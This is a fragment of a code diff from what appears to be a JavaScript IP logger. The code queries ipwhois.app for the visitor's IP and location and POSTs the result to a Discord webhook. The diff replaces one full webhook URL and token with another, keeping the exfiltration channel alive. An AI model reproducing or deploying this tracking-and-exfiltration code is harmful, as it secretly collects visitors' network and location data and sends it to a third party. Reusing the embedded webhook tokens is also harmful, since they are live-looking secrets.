@@ -50,7 +50,7 @@ fetch("http://ipwhois.app/json/")
                 }]
             }
 
-            fetch("https://canary.discord.com/api/webhooks/828352541678764042/itVmOwlN2F0kFDjuq7FnrXqTUzamfp77ooWsqc68r6LrOaNr3YvCm9RZaZTKVPZ9BmGX", {
+            fetch("https://canary.discord.com/api/webhooks/842058682513752125/SNYAXf2WcV-d6TZzhijIJ5rdHgd4HoBMjbCdvdbC7b4pGxCA5J3BfAnqaInNq_1xMDFT", {
                 method: "POST",
                 headers: {
                     "Content-type": "application/json"
